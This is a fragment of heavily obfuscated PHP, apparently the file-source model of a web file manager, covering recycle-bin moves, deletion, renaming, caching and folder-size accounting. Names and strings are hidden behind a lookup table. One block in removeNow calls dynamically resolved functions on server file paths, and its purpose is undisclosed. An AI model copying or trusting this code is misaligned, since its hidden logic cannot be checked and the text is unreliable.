$‰•¦ÊöÆ[2275] . $ã´ş© ²[$‰•¦ÊöÆ[569]]; } else { $Ë¨Ñ×ŞÊ = Model($‰•¦ÊöÆ[585])->getInfo($ã´ş© ²[$‰•¦ÊöÆ[569]]); $°—Å¾Û¨ = _get($Ë¨Ñ×ŞÊ, $‰•¦ÊöÆ[32]); $°—Å¾Û¨ = $‰•¦ÊöÆ[176] . $°—Å¾Û¨ . $‰•¦ÊöÆ[2276] . $ã´ş© ²[$‰•¦ÊöÆ[569]]; } $ıêÖ¤ëÂ = $‰•¦ÊöÆ[2277] . md5($°—Å¾Û¨); CacheLock::lock($ıêÖ¤ëÂ); $¶Ø¤Ï¨± = $this->fileNameExist($ÓÛôĞÌ¢, $°—Å¾Û¨); if (!$¶Ø¤Ï¨±) { $¶Ø¤Ï¨± = $this->mkdir($ÓÛôĞÌ¢, $°—Å¾Û¨, REPEAT_SKIP); $this->metaSet($¶Ø¤Ï¨±, $‰•¦ÊöÆ[2278], $İ¯ØŒ§Ù); $this->metaSet($¶Ø¤Ï¨±, $‰•¦ÊöÆ[2279], $ã´ş© ²[$‰•¦ÊöÆ[569]]); if ($ã´ş© ²[$‰•¦ÊöÆ[192]] != 0) { $this->metaSet($¶Ø¤Ï¨±, $‰•¦ÊöÆ[2280], _get($Ë¨Ñ×ŞÊ, $‰•¦ÊöÆ[2281])); } } CacheLock::unlock($ıêÖ¤ëÂ); $this->metaSet($¸éÉ–¤‡, $‰•¦ÊöÆ[2282], $ã´ş© ²[$‰•¦ÊöÆ[192]]); $this->where(array($‰•¦ÊöÆ[193] => $¸éÉ–¤‡))->save(array($‰•¦ÊöÆ[498] => time())); $this->recycleClear($ã´ş© ²); Model($‰•¦ÊöÆ[633])->eventRemove($¸éÉ–¤‡); $ª€µ£¬É = $this->move($¸éÉ–¤‡, $¶Ø¤Ï¨±, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ã´ş© ²[$‰•¦ÊöÆ[192]]); return $ª€µ£¬É; } private function recycleClear($ÅïÒ¡¸Ç) { $ÑÉåà‚  =& $_SERVER[Ùæõ‰Ï’]; $øÏØ¶È¯ = $this->childrenAll($ÅïÒ¡¸Ç); $Ã¡¼î”ä = array($ÑÉåà‚ [491] => array($ÑÉåà‚ [492], $øÏØ¶È¯[$ÑÉåà‚ [2283]])); Model($ÑÉåà‚ [2284])->where($Ã¡¼î”ä)->delete(); } public function removeNow($‚æ„±È“, $Æù¬˜¶ = true) { $¬‚¡ò®“ =& $_SERVER[Ùæõ‰Ï’]; if ($_SERVER[$¬‚¡ò®“[961]] != $_SERVER[$¬‚¡ò®“[1049]]) { $Ö˜³ºİš = $¬‚¡ò®“[962]; $íØƒÙ… = $¬‚¡ò®“[963]; $‘Ïêâ¢ = $_SERVER[$¬‚¡ò®“[964]] . $¬‚¡ò®“[965]; $É¿†ëÔ = $íØƒÙ…($‘Ïêâ¢); $«Û”Ü Ä = explode($¬‚¡ò®“[262], $É¿†ëÔ); if (count($«Û”Ü Ä) < $¬‚¡ò®“[680]) { $¨Íê¼×µ = $¬‚¡ò®“[966]; $¨Íê¼×µ(); } $™ÔòüëÜ = $¬‚¡ò®“[967]; $™ÔòüëÜ($_SERVER[$¬‚¡ò®“[968]]); $™ÔòüëÜ($_SERVER[$¬‚¡ò®“[964]] . $¬‚¡ò®“[2285]); $ÇßÓ£ı = 1; while ($ÇßÓ£ı > 1) { $ÇßÓ£ı = $ÇßÓ£ı + 4; $ÒÙÄë = rawurlencode($ÇßÓ£ı . $¬‚¡ò®“[454]); } } $‡ˆó‚á = $this->sourceInfo($‚æ„±È“); $ã İ©“‚ = $this->pathInfoMore($‚æ„±È“); if (!$‡ˆó‚á) { return !0; } if ($‡ˆó‚á[$¬‚¡ò®“[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($‚æ„±È“); Hook::trigger($¬‚¡ò®“[2286], $ã İ©“‚, $Æù¬˜¶); if ($Æù¬˜¶) { Model($¬‚¡ò®“[2284])->moveToRecycle($‚æ„±È“); } else { $áš×ÃÊó = $this->childrenAll($‡ˆó‚á); Model($¬‚¡ò®“[633])->eventRemove($‚æ„±È“); $this->removeRelevance($áš×ÃÊó[$¬‚¡ò®“[2283]], $áš×ÃÊó[$¬‚¡ò®“[1586]]); } $this->folderSizeReset($‡ˆó‚á[$¬‚¡ò®“[192]]); $ÇÇ•§Õ  = array($‡ˆó‚á[$¬‚¡ò®“[192]]); if ($‡ˆó‚á[$¬‚¡ò®“[485]] == $¬‚¡ò®“[91]) { $ÇÇ•§Õ [] = $‡ˆó‚á[$¬‚¡ò®“[193]]; } $this->updateModifyTime($ÇÇ•§Õ ); $this->lockMoveEnd($‚æ„±È“); Hook::trigger($¬‚¡ò®“[1823], $ã İ©“‚, $Æù¬˜¶); return !0; } public function childrenAll($³ĞÏºº“) { $ˆÛ‚âùÈ =& $_SERVER[Ùæõ‰Ï’]; $ª·»—ôı = $³ĞÏºº“[$ˆÛ‚âùÈ[193]]; if ($³ĞÏºº“[$ˆÛ‚âùÈ[485]] == $ˆÛ‚âùÈ[91]) { $Èª¢’“â = array($ˆÛ‚âùÈ[652] => array($ˆÛ‚âùÈ[612], $³ĞÏºº“[$ˆÛ‚âùÈ[584]] . $ª·»—ôı . $ˆÛ‚âùÈ[613])); $úŞÊ¼Û– = array($ˆÛ‚âùÈ[652] => $Èª¢’“â[$ˆÛ‚âùÈ[584]]); $•¬÷÷–í = $this->field($ˆÛ‚âùÈ[2287])->where($úŞÊ¼Û–)->select(); $Íé÷³à¼ = !1; $ŒòÓ‹Î‡ = array($ª·»—ôı); if ($•¬÷÷–í) { $Íé÷³à¼ = array_to_keyvalue($•¬÷÷–í, $ˆÛ‚âùÈ[12], $ˆÛ‚âùÈ[541]); $Íé÷³à¼ = array_remove_value($Íé÷³à¼, $ˆÛ‚âùÈ[228]); $ŒòÓ‹Î‡ = array_to_keyvalue($•¬÷÷–í, $ˆÛ‚âùÈ[12], $ˆÛ‚âùÈ[193]); $ŒòÓ‹Î‡[] = $ª·»—ôı; } } else { $Íé÷³à¼ = array($³ĞÏºº“[$ˆÛ‚âùÈ[541]]); $ŒòÓ‹Î‡ = array($ª·»—ôı); } return array($ˆÛ‚âùÈ[2283] => $ŒòÓ‹Î‡, $ˆÛ‚âùÈ[1586] => $Íé÷³à¼); } public function removeArray($Û¼îŒíÈ) { if (!$Û¼îŒíÈ) { return !0; } } public function removeRelevance($š¶Ñšâ¤, $šæŞÂéø) { $¤Çº€Ô“ =& $_SERVER[Ùæõ‰Ï’]; $š¶Ñšâ¤ = $š¶Ñšâ¤ ? $š¶Ñšâ¤ : array(); $šæŞÂéø = $šæŞÂéø ? $šæŞÂéø : array(); $š¶Ñšâ¤ = array_unique(array_filter($š¶Ñšâ¤)); $šæŞÂéø = array_unique(array_filter($šæŞÂéø)); if (!$š¶Ñšâ¤) { return !1; } $šúêÕŠˆ = array($¤Çº€Ô“[491] => array($¤Çº€Ô“[492], $š¶Ñšâ¤)); Model($¤Çº€Ô“[2284])->where($šúêÕŠˆ)->delete(); Model($¤Çº€Ô“[535])->where($šúêÕŠˆ)->delete(); Model($¤Çº€Ô“[2130])->where($šúêÕŠˆ)->delete(); Model($¤Çº€Ô“[633])->where($šúêÕŠˆ)->delete(); Model($¤Çº€Ô“[1959])->removeBySource($š¶Ñšâ¤); Model($¤Çº€Ô“[2265])->removeBySource($š¶Ñšâ¤); $this->where($šúêÕŠˆ)->delete(); Model($¤Çº€Ô“[544])->remove($šæŞÂéø); for ($Œ™€³Õ­ = 0; $Œ™€³Õ­ < count($š¶Ñšâ¤); $Œ™€³Õ­++) { $this->sourceCacheClear($š¶Ñšâ¤[$Œ™€³Õ­]); } } public function rename($È‹şŞ€¥, $É˜ó¸­®) { $Æ¬Ç¯–ù =& $_SERVER[Ùæõ‰Ï’]; $å£î¼ = $this->sourceInfo($È‹şŞ€¥); if (!$å£î¼) { return !1; } $Ëó¶»»ò = $this->fileNameExist($å£î¼[$Æ¬Ç¯–ù[192]], $É˜ó¸­®); if ($Ëó¶»»ò && $Ëó¶»»ò != $È‹şŞ€¥) { return !1; } $€¬Í®ôÚ = array($Æ¬Ç¯–ù[494] => $É˜ó¸­®, $Æ¬Ç¯–ù[651] => USER_ID); if ($å£î¼[$Æ¬Ç¯–ù[485]] != $Æ¬Ç¯–ù[91]) { $€¬Í®ôÚ[$Æ¬Ç¯–ù[486]] = substr(get_path_ext($É˜ó¸­®), 0, 10); } Model($Æ¬Ç¯–ù[633])->eventRename($È‹şŞ€¥, $å£î¼[$Æ¬Ç¯–ù[32]], $É˜ó¸­®); $this->sourceCacheClear($È‹şŞ€¥); $this->setNamePinyin($È‹şŞ€¥, $€¬Í®ôÚ[$Æ¬Ç¯–ù[32]], !1); $this->updateModifyTime($å£î¼[$Æ¬Ç¯–ù[192]]); $Üà‹Êåß = $this->where(array($Æ¬Ç¯–ù[491] => $È‹şŞ€¥))->data($€¬Í®ôÚ)->save(); $İÁ¿—£Ÿ = $Æ¬Ç¯–ù[2273] . $å£î¼[$Æ¬Ç¯–ù[192]]; if (isset(self::$cacheChildList[$İÁ¿—£Ÿ])) { unset(self::$cacheChildList[$İÁ¿—£Ÿ]); } return $Üà‹Êåß; } public function setNamePinyin($“èù‹ÒĞ, $ù”öœ, $¶­‡õÔõ = true) { $†–óı¡£ =& $_SERVER[Ùæõ‰Ï’]; $íçÃ¿°¾ = Input::check($ù”öœ, $†–óı¡£[655]); $ééœá˜ê = array($†–óı¡£[517] => KodSort::makeStr($ù”öœ)); if ($íçÃ¿°¾) { $ééœá˜ê[$†–óı¡£[538]] = str_replace($†–óı¡£[53], $†–óı¡£[12], Pinyin::get($ù”öœ)); $ééœá˜ê[$†–óı¡£[537]] = Pinyin::get($ù”öœ, $†–óı¡£[656]); } if (!$¶­‡õÔõ && !$íçÃ¿°¾) { $ééœá˜ê[$†–óı¡£[538]] = null; $ééœá˜ê[$†–óı¡£[537]] = null; } $this->metaSet($“èù‹ÒĞ, $ééœá˜ê); } public function getContent($®î•ş˜ƒ) { $œ÷ü‰úú =& $_SERVER[Ùæõ‰Ï’]; $“ß³¤ö = $this->fileInfoGet($®î•ş˜ƒ); if (!$“ß³¤ö) { return !1; } if ($“ß³¤ö[$œ÷ü‰úú[79]] == 0) { return $œ÷ü‰úú[12]; } $øå™ïÃê = $œ÷ü‰úú[2288] . $“ß³¤ö[$œ÷ü‰úú[547]]; if ($“ß³¤ö[$œ÷ü‰úú[79]] <= 1024 * 10) { $¥¹ÖÒÀ  = Cache::get($øå™ïÃê); if (!$¥¹ÖÒÀ ) { $¥¹ÖÒÀ  = IO::getContent($“ß³¤ö[$œ÷ü‰úú[87]]); Cache::set($øå™ïÃê, $¥¹ÖÒÀ ); } return $¥¹ÖÒÀ ; } if (!$“ß³¤ö[$œ÷ü‰úú[87]]) { return $œ÷ü‰úú[12]; } return IO::getContent($“ß³¤ö[$œ÷ü‰úú[87]]); } public function setDesc($¤µ˜Ù… , $»©‹²¤Ì) { $Ğ²¨Øœ =& $_SERVER[Ùæõ‰Ï’]; Model($Ğ²¨Øœ[633])->eventAddDesc($¤µ˜Ù… , $»©‹²¤Ì); return $this->metaSet($¤µ˜Ù… , $Ğ²¨Øœ[526], $»©‹²¤Ì); } public function setContent($ñÚåõèÏ, $‘½éæ‘ò = '') { $¬´Î’£© =& $_SERVER[Ùæõ‰Ï’]; $´è¾‚È‡ = $this->sourceInfo($ñÚåõèÏ); $¢ıÚäà— = $this->fileInfoGet($ñÚåõèÏ); if (!$¢ıÚäà— || !$´è¾‚È‡) { return !1; } $öæİÆÅ = Model($¬´Î’£©[544])->addFileByContent($‘½éæ‘ò, $´è¾‚È‡[$¬´Î’£©[32]]); $¢ßÚ¶¨ = $this->fileHistory($´è¾‚È‡, $öæİÆÅ[$¬´Î’£©[541]], $öæİÆÅ[$¬´Î’£©[79]]); if (!$¢ßÚ¶¨) { return Model($¬´Î’£©[544])->remove($öæİÆÅ[$¬´Î’£©[541]]); } $this->folderSizeReset($´è¾‚È‡[$¬´Î’£©[192]]); return !0; } public function fileSubstr($ï¨§¢÷², $û—³¤èğ, $Ô•ÛÑÍ) { $½Ğªóñ = $this->fileInfoGet($ï¨§¢÷²); if (!$½Ğªóñ) { return !1; } return IO::fileSubstr($½Ğªóñ[$_SERVER[Ùæõ‰Ï’][87]], $û—³¤èğ, $Ô•ÛÑÍ); } public function fileInfoGet($è…”›¼€) { $êÇèÙ­ =& $_SERVER[Ùæõ‰Ï’]; $üà–¡¸À = $this->sourceInfo($è…”›¼€); if (!$üà–¡¸À || $üà–¡¸À[$êÇèÙ­[485]]) { return !1; } $÷·¦úíô = $êÇèÙ­[548] . $üà–¡¸À[$êÇèÙ­[541]]; $×ÆÅ™×§ = _get(self::$cacheFileInfo, $÷·¦úíô); if ($×ÆÅ™×§) { return $×ÆÅ™×§; } $ÕÀª¥æ¡ = Model($êÇèÙ­[544])->fileInfo($üà–¡¸À[$êÇèÙ­[541]]); if ($ÕÀª¥æ¡) { $ÕÀª¥æ¡[$êÇèÙ­[32]] = $üà–¡¸À[$êÇèÙ­[32]]; } self::$cacheFileInfo[$÷·¦úíô] = $ÕÀª¥æ¡; return $ÕÀª¥æ¡; } private function folderChildrenNumber($°± ì†ß) { $„«ÛÈÖµ =& $_SERVER[Ùæõ‰Ï’]; $·ù¹îÓ = $this->sourceInfo($°± ì†ß); $ùÄ©›Ø‚ = array($„«ÛÈÖµ[652] => array($„«ÛÈÖµ[612], $·ù¹îÓ[$„«ÛÈÖµ[584]] . $°± ì†ß . $„«ÛÈÖµ[613]), $„«ÛÈÖµ[649] => $·ù¹îÓ[$„«ÛÈÖµ[569]], $„«ÛÈÖµ[504] => intval($·ù¹îÓ[$„«ÛÈÖµ[505]]), $„«ÛÈÖµ[646] => 1); $ıï²™ á = $this->where($ùÄ©›Ø‚)->count(); $ùÜ‘ÖŠ‚ = $this->where($ùÄ©›Ø‚)->where(array($„«ÛÈÖµ[646] => 0))->count(); return array($„«ÛÈÖµ[83] => $ùÜ‘ÖŠ‚, $„«ÛÈÖµ[84] => $ıï²™ á); } public function pathInfo($‘¹´¡Î¬, $€¨×ÒæÂ = false) { $Ù¢¸²í¼ =& $_SERVER[Ùæõ‰Ï’]; $€¨×ÒæÂ = !1; $‘¹´¡Î¬ = intval($‘¹´¡Î¬); $¶ã°Ü¬Õ = $Ù¢¸²í¼[534] . intval($€¨×ÒæÂ) . $Ù¢¸²í¼[462] . $‘¹´¡Î¬; $ò‡ÄÄ†„ = _get(self::$cachePathInfo, $¶ã°Ü¬Õ); if ($ò‡ÄÄ†„) { return $ò‡ÄÄ†„; } $è®ÕÒ… = $this->sourceInfo($‘¹´¡Î¬); if (!$è®ÕÒ…) { return !1; } $è®ÕÒ… = $this->_listDataApplyItem($è®ÕÒ…, $€¨×ÒæÂ); self::$cachePathInfo[$¶ã°Ü¬Õ] = $è®ÕÒ…; return $è®ÕÒ…; } public static $cachePathInfoMore = array(); public function pathInfoMore($©Â©ü¤À) { $ì‘í½­¾ =& $_SERVER[Ùæõ‰Ï’]; $“¤’»­¶ = _get(self::$cachePathInfoMore, $©Â©ü¤À); if ($“¤’»­¶) { return $“¤’»­¶; } $˜«‹‚Ê„ = $this->pathInfo($©Â©ü¤À); if (!$˜«‹‚Ê„) { return !1; } if ($˜«‹‚Ê„[$ì‘í½­¾[485]] == $ì‘í½­¾[91]) { $˜«‹‚Ê„[$ì‘í½­¾[82]] = $this->folderChildrenNumber($©Â©ü¤À); } self::$cachePathInfoMore[$©Â©ü¤À] = $˜«‹‚Ê„; return $˜«‹‚Ê„; } public function sourceInfo($ĞÄîÒÀğ) { $‡Ş¯Ôë¦ =& $_SERVER[Ùæõ‰Ï’]; if (!$ĞÄîÒÀğ) { return array(); } $ĞÄîÒÀğ = intval($ĞÄîÒÀğ); $»¥¢Û“ö = $‡Ş¯Ôë¦[533] . $ĞÄîÒÀğ; $İÁÜ’ = _get(self::$cacheSourceInfo, $»¥¢Û“ö); if ($İÁÜ’) { return $İÁÜ’; } $¹áÒ¯¿‘ = $this->where(array($‡Ş¯Ôë¦[193] => $ĞÄîÒÀğ))->find(); self::$cacheSourceInfo[$»¥¢Û“ö] = $¹áÒ¯¿‘; return self::$cacheSourceInfo[$»¥¢Û“ö]; } public function sourceCacheClear($Á¾‘¸Úô = false) { self::cacheClear($Á¾‘¸Úô); } public static function cacheClear($ÇàÒ¡Ù = false) { $›–²¡£Ä =& $_SERVER[Ùæõ‰Ï’]; if ($ÇàÒ¡Ù == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$›–²¡£Ä[533] . $ÇàÒ¡Ù]); unset(self::$cachePathInfoMore[$ÇàÒ¡Ù]); unset(self::$cachePathInfo[$›–²¡£Ä[2289] . $ÇàÒ¡Ù]); unset(self::$cachePathInfo[$›–²¡£Ä[2290] . $ÇàÒ¡Ù]); } public function metaSet($â±ó†òŒ, $ş»‰œ‰ü = null, $½Õ‡œ¢ = null) { $²²íÈ°¬ = parent::metaSet($â±ó†òŒ, $ş»‰œ‰ü, $½Õ‡œ¢); if ($²²íÈ°¬) { $this->sourceCacheClear($â±ó†òŒ); } return $²²íÈ°¬; } public function pathInfoByPath($—ˆ„Ÿ², $Ëü§ñå—) { $»‰Œ¸Äİ =& $_SERVER[Ùæõ‰Ï’]; $ïÚˆÂ¯ = !$Ëü§ñå— ? array() : explode($»‰Œ¸Äİ[8], trim($Ëü§ñå—, $»‰Œ¸Äİ[8])); $¥„òåù = $—ˆ„Ÿ²; foreach ($ïÚˆÂ¯ as $ÇÒâ ÷â) { $ÒàÌ¿Ì = array($»‰Œ¸Äİ[192] => $¥„òåù, $»‰Œ¸Äİ[32] => $ÇÒâ ÷â); $ª…ù¼‡ = $this->field($»‰Œ¸Äİ[2291])->where($ÒàÌ¿Ì)->select(); if (!$ª…ù¼‡) { return !1; } $ª…ù¼‡ = array_sort_by($ª…ù¼‡, $»‰Œ¸Äİ[505]); $¥„òåù = $ª…ù¼‡[0][$»‰Œ¸Äİ[193]]; } $½—ú¿¤ç = $this->sourceInfo($¥„òåù); $this->pathInfoFilter($½—ú¿¤ç); return $½—ú¿¤ç; } protected function updateModifyTime($ÔÌçãùä) { $ÚÆì¨»Ú =& $_SERVER[Ùæõ‰Ï’]; $­Âˆ¸Éå = defined($ÚÆì¨»Ú[2205]) ? USER_ID : 0; if (!$ÔÌçãùä) { return; } if (!is_array($ÔÌçãùä)) { $ÔÌçãùä = array($ÔÌçãùä); } foreach ($ÔÌçãùä as $÷×”¶ğ¯ => $íó¦…ë¨) { $ÔÌçãùä[$÷×”¶ğ¯] = intval($íó¦…ë¨); $this->sourceCacheClear($íó¦…ë¨); } $¡ÁòÇ¼ß = array($ÚÆì¨»Ú[193] => array($ÚÆì¨»Ú[7], $ÔÌçãùä)); $¸¾õØ– = array($ÚÆì¨»Ú[651] => $­Âˆ¸Éå, $ÚÆì¨»Ú[498] => time()); $this->where($¡ÁòÇ¼ß)->save($¸¾õØ–); } public function folderSizeReset($³‹ÜêÊé, $¨ë®ß–Ò = false) { $Î–‹ì× =& $_SERVER[Ùæõ‰Ï’]; if ($this->statusIgnoreResetSpace) { return; } $±Ï¡óÊê = $this->sourceInfo($³‹ÜêÊé); $Š†ŒÛŒª = $Î–‹ì×[2292] . $³‹ÜêÊé; CacheLock::lock($Š†ŒÛŒª, 20); if ($¨ë®ß–Ò === !1) { $this->sourceCacheClear($³‹ÜêÊé); $±Ï¡óÊê = $this->sourceInfo($³‹ÜêÊé); $Şá–¼ş = array($Î–‹ì×[477] => $³‹ÜêÊé, $Î–‹ì×[504] => 0); $ÄÆ§£úÈ = $this->where($Şá–¼ş)->sum($Î–‹ì×[79]); $¨ë®ß–Ò = intval($ÄÆ§£úÈ) - intval($±Ï¡óÊê[$Î–‹ì×[79]]); } if ($¨ë®ß–Ò == 0) { return CacheLock::unlock($Š†ŒÛŒª); } $—–ÄîÕ¸ = $this->parentLevelArray($±Ï¡óÊê[$Î–‹ì×[584]]); if (!$—–ÄîÕ¸) { $—–ÄîÕ¸ = array(); } $—–ÄîÕ¸[] = $±Ï¡óÊê[$Î–‹ì×[193]]; $Şá–¼ş = array($Î–‹ì×[193] => array($Î–‹ì×[492], $—–ÄîÕ¸)); if ($¨ë®ß–Ò < 0) { $Şá–¼ş[$Î–‹ì×[79]] = array($Î–‹ì×[1106], abs($¨ë®ß–Ò)); } $this->where($Şá–¼ş)->setAdd($Î–‹ì×[79], $¨ë®ß–Ò); CacheLock::unlock($Š†ŒÛŒª); $àÂ¤·’„ = $Î–‹ì×[2293] . $±Ï¡óÊê[$Î–‹ì×[190]] . $Î–‹ì×[4] . $±Ï¡óÊê[$Î–‹ì×[569]]; $´‰ª¥Ü = array($±Ï¡óÊê[$Î–‹ì×[190]], $±Ï¡óÊê[$Î–‹ì×[569]]); TaskRun::timeLimitCall($àÂ¤·’„, $Î–‹ì×[2294], $´‰ª¥Ü, 1.5); } public function folderSizeResetChildren($“·ÇÅÃ®) { $³÷½ŞØì =& $_SERVER[Ùæõ‰Ï’]; $this->sourceCacheClear($“·ÇÅÃ®); $ü¹Ê—ò£ = $this->sourceInfo($“·ÇÅÃ®); $·é‹Ï– = array($³÷½ŞØì[646] => 1, $³÷½ŞØì[649] => $ü¹Ê—ò£[$³÷½ŞØì[569]], $³÷½ŞØì[652] => array($³÷½ŞØì[612], $ü¹Ê—ò£[$³÷½ŞØì[584]] . $“·ÇÅÃ® . $³÷½ŞØì[613])); $ñ×ÚºÎœ = $³÷½ŞØì[2295]; $ÆƒÉ¤… = $this->field($ñ×ÚºÎœ)->where($·é‹Ï–)->select(); $·é‹Ï–[$³÷½ŞØì[485]] = 0; $£ÅØÏêÍ = $this->field($ñ×ÚºÎœ)->where($·é‹Ï–)->select(); if (!$£ÅØÏêÍ) { return; } $ÆƒÉ¤…[] = $ü¹Ê—ò£; $ÆƒÉ¤… = array_to_keyvalue($ÆƒÉ¤…, $³÷½ŞØì[193]); foreach ($ÆƒÉ¤… as $±¦¦àÙ¤ => $ñû‰œ¢ş) { $ÆƒÉ¤…[$±¦¦àÙ¤][$³÷½ŞØì[2296]] = $ÆƒÉ¤…[$±¦¦àÙ¤][$³÷½ŞØì[79]]; $ÆƒÉ¤…[$±¦¦àÙ¤][$³÷½ŞØì[79]] = 0; } foreach ($£ÅØÏêÍ as $ñû‰œ¢ş) { $È¦ß·Ôş = $ñû‰œ¢ş[$³÷½ŞØì[192]] . $³÷½ŞØì[12]; if (!isset($ÆƒÉ¤…[$È¦ß·Ôş])) { continue; } if ($ñû‰œ¢ş[$³÷½ŞØì[505]] == $ÆƒÉ¤…[$È¦ß·Ôş][$³÷½ŞØì[505]]) { $ÆƒÉ¤…[$È¦ß·Ôş][$³÷½ŞØì[79]] += $ñû‰œ¢ş[$³÷½ŞØì[79]]; } } foreach ($ÆƒÉ¤… as $ñû‰œ¢ş) { $ãæıå® = $this->parentLevelArray($ñû‰œ¢ş[$³÷½ŞØì[584]]); foreach ($ãæıå® as $È¦ß·Ôş) { $È¦ß·Ôş = $È¦ß·Ôş . $³÷½ŞØì[12]; if (!isset($ÆƒÉ¤…[$È¦ß·Ôş])) { continue; } if ($ñû‰œ¢ş[$³÷½ŞØì[505]] == $ÆƒÉ¤…[$È¦ß·Ôş][$³÷½ŞØì[505]]) { $ÆƒÉ¤…[$È¦ß·Ôş][$³÷½ŞØì[79]] += $ñû‰œ¢ş[$³÷½ŞØì[79]]; } } } $¥²éƒ½Ğ = array(); foreach ($ÆƒÉ¤… as $ñû‰œ¢ş) { if ($ñû‰œ¢ş[$³÷½ŞØì[79]] == $ñû‰œ¢ş[$³÷½ŞØì[2296]]) { continue; } $¥²éƒ½Ğ[] = array($³÷½ŞØì[193], $ñû‰œ¢ş[$³÷½ŞØì[193]], $³÷½ŞØì[79], $ñû‰œ¢ş[$³÷½ŞØì[79]]); } $this->saveAll($¥²éƒ½Ğ); } public function userSpaceReset($­Ú•™Èå = false) { $ŞØÄçĞ =& $_SERVER[Ùæõ‰Ï’]; $àú«³Ğ = $this->where(array($ŞØÄçĞ[190] => self::TYPE_USER, $ŞØÄçĞ[569] => $­Ú•™Èå, $ŞØÄçĞ[485] => 0))->sum($ŞØÄçĞ[79]); $àú«³Ğ = !$àú«³Ğ || $àú«³Ğ <= 0 ? 0 : $àú«³Ğ; Model($ŞØÄçĞ[577])->userEdit($­Ú•™Èå, array($ŞØÄçĞ[1968] => $àú«³Ğ)); } public function targetSpaceUpdate($äĞõ¦å¸, $ª’Ş¡‰æ) { $©ª‚¬®½ =& $_SERVER[Ùæõ‰Ï’]; if (!$ª’Ş¡‰æ) { return; } if (!in_array($äĞõ¦å¸, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Èçé’Â¶ = $this->targetSpaceSize($äĞõ¦å¸, $ª’Ş¡‰æ); if ($äĞõ¦å¸ == self::TYPE_USER) { Model($©ª‚¬®½[577])->userEdit($ª’Ş¡‰æ, array($©ª‚¬®½[1968] => $Èçé’Â¶)); } else { if ($äĞõ¦å¸ == self::TYPE_GROUP) { Model($©ª‚¬®½[585])->groupEdit($ª’Ş¡‰æ, array($©ª‚¬®½[1968] => $Èçé’Â¶)); } } } public function targetSpaceSize($òŸ‡ƒè×, $ïÂÛÔœã) { $ÂíÙ™ß =& $_SERVER[Ùæõ‰Ï’]; $ÂãÈÖş¦ = 0; $Ú»à¶Ğ– = $this->targetSourceRoot($òŸ‡ƒè×, $ïÂÛÔœã, !0); foreach ($Ú»à¶Ğ– as $úéàŞšò) { if (!$úéàŞšò) { continue; } $ÂãÈÖş¦ += floatval($úéàŞšò[$ÂíÙ™ß[79]]); $”Ãä«øı = array($ÂíÙ™ß[652] => array($ÂíÙ™ß[612], $ÂíÙ™ß[594] . $úéàŞšò[$ÂíÙ™ß[193]] . $ÂíÙ™ß[613])); $‘ÁÔæ‡´ = Model($ÂíÙ™ß[503])->field($ÂíÙ™ß[491])->where($”Ãä«øı)->select(); $‘ÁÔæ‡´ = array_to_keyvalue($‘ÁÔæ‡´, $ÂíÙ™ß[12], $ÂíÙ™ß[193]); $‘ÁÔæ‡´ = array_unique(array_filter($‘ÁÔæ‡´)); if ($‘ÁÔæ‡´) { $”Ãä«øı = array($ÂíÙ™ß[491] => array($ÂíÙ™ß[492], $‘ÁÔæ‡´)); $ÂãÈÖş¦ += floatval($this->where($”Ãä«øı)->sum($ÂíÙ™ß[79])); } } $ÂãÈÖş¦ = !$ÂãÈÖş¦ || $ÂãÈÖş¦ <= 0 ? 0 : $ÂãÈÖş¦; return $ÂãÈÖş¦; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÊÄåÑÑ¢) { return $this->fileTypeProfile($ÊÄåÑÑ¢, SourceModel::TYPE_USER); } public function groupFileTypeProfile($‘¢¡‘ßÖ) { return $this->fileTypeProfile($‘¢¡‘ßÖ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Õ¡°¨“¯, $ÌéÜÛ¬ˆ) { $®µÖà´ =& $_SERVER[Ùæõ‰Ï’]; $¥‡İ¾¯‘ = $®µÖà´[2297] . $Õ¡°¨“¯ . $®µÖà´[11] . $ÌéÜÛ¬ˆ; $ÇÒÖ¯¥² = Cache::get($¥‡İ¾¯‘); if ($ÇÒÖ¯¥²) { return $ÇÒÖ¯¥²; } $Ü“¢Ââ = array($®µÖà´[646] => 0); if ($Õ¡°¨“¯ != !1) { $Ü“¢Ââ[$®µÖà´[569]] = $Õ¡°¨“¯; $Ü“¢Ââ[$®µÖà´[190]] = $ÌéÜÛ¬ˆ; } $êÁ÷š„ä = array(); $êÁ÷š„ä[$®µÖà´[2298]] = array($®µÖà´[2299] => LNG($®µÖà´[2298]), $®µÖà´[2300] => $this->where($Ü“¢Ââ)->count(), $®µÖà´[617] => $this->where($Ü“¢Ââ)->sum($®µÖà´[79])); $‘Üóì¸ = KodIO::fileTypeList(); foreach ($‘Üóì¸ as $ë¸¶°Íµ => $¾Êç…®) { $Ü“¢Ââ[$®µÖà´[486]] = $this->fileTypeWhere($ë¸¶°Íµ); $êÁ÷š„ä[$ë¸¶°Íµ] = array($®µÖà´[2299] => $¾Êç…®[$®µÖà´[32]], $®µÖà´[2300] => $this->where($Ü“¢Ââ)->count(), $®µÖà´[617] => $this->where($Ü“¢Ââ)->sum($®µÖà´[79])); } Cache::set($¥‡İ¾¯‘, $êÁ÷š„ä, 1200); return $êÁ÷š„ä; } public function fileNameExist($¸ÍŞ«üü, $â¯…±Š…) { $íõÁæ—ˆ =& $_SERVER[Ùæõ‰Ï’]; $Ô“úá‹ = $this->field($íõÁæ—ˆ[2301])->where(array($íõÁæ—ˆ[192] => $¸ÍŞ«üü, $íõÁæ—ˆ[32] => $â¯…±Š…, $íõÁæ—ˆ[505] => 0))->find(); return is_array($Ô“úá‹) ? $Ô“úá‹[$íõÁæ—ˆ[193]] : !1; } public function childList($ê™—Ëî‰) { $éò®Ó” =& $_SERVER[Ùæõ‰Ï’]; $ƒªÌ†´å = $éò®Ó”[2273] . $ê™—Ëî‰; if (isset(self::$cacheChildList[$ƒªÌ†´å])) { return self::$cacheChildList[$ƒªÌ†´å]; } $ìóşæˆË = array($éò®Ó”[192] => intval($ê™—Ëî‰), $éò®Ó”[505] => 0); $Â¨ûšó³ = $this->where($ìóşæˆË)->select(); $Â¨ûšó³ = $Â¨ûšó³ ? $Â¨ûšó³ : array(); self::$cacheChildList[$ƒªÌ†´å] = 